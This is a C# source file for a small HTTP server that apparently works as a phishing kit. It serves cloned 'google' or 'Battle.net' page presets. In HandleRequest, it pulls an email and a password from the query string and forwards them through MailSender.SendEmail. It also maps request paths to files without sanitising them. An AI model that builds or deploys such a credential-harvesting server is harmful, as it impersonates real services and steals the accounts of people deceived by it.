using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace MyHttpServer
{
    public class Server
    {
        private readonly HttpListener ? _server;
        private readonly ServerConfiguration ? _configuration;
        private bool _isAlive;
        private string ? _contentType;
        private readonly object _lock = new object();
        private string ? _sitePreset;

        public Server(string siteType)
        {
            lock (_lock)
            {
                if (_server == null)
                {
                    lock (_lock)
                    {
                        if (siteType == "google")
                        {
                            _sitePreset = "/google/";
                        }
                        else
                        {
                            _sitePreset = "/Battle.net/";
                        }
                        _configuration = new ServerConfiguration();
                        _server = new HttpListener();
                    }
                }
            }
        }

        /// <summary>
        /// Start HTTP Server
        /// </summary>
        /// <returns></returns>
        public async Task Start()
        {
            _configuration.Set(_server);
            _server.Start();
            _isAlive = true;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("==== The server started working! ====\n");
            Console.ResetColor();

            var serverTask = ServerProcessAsync();

            Console.WriteLine("Type 'stop' and press 'Enter' to stop the server.\n");
            while (_isAlive)
            {
                if (Console.ReadLine()?.ToLower() == "stop")
                {
                    Stop();
                    _isAlive = false;
                }
            }

            if(_isAlive)
                await serverTask;

        }

        private void Stop()
        {
            lock (_lock)
            {
                if (_isAlive)
                {
                    _server.Stop();
                    _server.Close();
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n==== The server has been successfully stopped! ====\n");
                    Console.ResetColor();
                }
            }
        }

        private async Task ServerProcessAsync()
        {
            while (_isAlive)
            {
                var context = await _server.GetContextAsync();
                HandleRequest(context);
            }
        }

        private void HandleRequest(HttpListenerContext context)
        {
            try
            {
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                string requestUrl = request.Url!.AbsolutePath, filePath = requestUrl,
                    email = "", password = "";

                if (request.RawUrl.StartsWith("/?"))
                {
                    email = HttpUtility.UrlDecode(request.RawUrl.Trim('/').Trim('?').Split('&')[0].Split('=')[1]);
                    password = HttpUtility.UrlDecode(request.RawUrl.Trim('/').Trim('?').Split('&')[1].Split('=')[1]);
                    MailSender.SendEmail(email, password);
                }

                if (filePath == "/")
                    filePath = _configuration!.StaticFilesPath + _sitePreset + "index.html";

                if (filePath.StartsWith("/"))
                    filePath = filePath.Trim('/');

                if (!File.Exists(filePath))
                {
                    if (!File.Exists(_configuration!.StaticFilesPath + _sitePreset + filePath))
                    {
                        response.StatusCode = (int)HttpStatusCode.NotFound;
                        filePath = $"{_configuration.StaticFilesPath}/404.html";
                    }
                    else
                    {
                        filePath = _configuration.StaticFilesPath + _sitePreset + filePath;
                    }
                }

                string extension = Path.GetExtension(filePath);

                ParseExtention(extension);

                response.ContentType = _contentType;

                using (var fileStream = File.OpenRead(filePath))
                {
                    fileStream.CopyTo(response.OutputStream);
                }

                response.Close();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error handling request: {ex.Message}");
                Console.ResetColor();
            }
        }

        /// <summary>
        /// Get content type
        /// </summary>
        /// <param name="extention"></param>
        private void ParseExtention(string extention)
        {
            switch (extention)
            {
                case ".html":
                    _contentType = "text/html";
                    break;
                case ".css":
                    _contentType = "text/css";
                    break;
                case ".jpeg":
                    _contentType = "image/jpeg";
                    break;
                case ".png":
                    _contentType = "image/png";
                    break;
                case ".svg":
                    _contentType = "image/svg+xml";
                    break;
                case ".ico":
                    _contentType = "image/x-icon";
                    break;
            }
        }
    }
}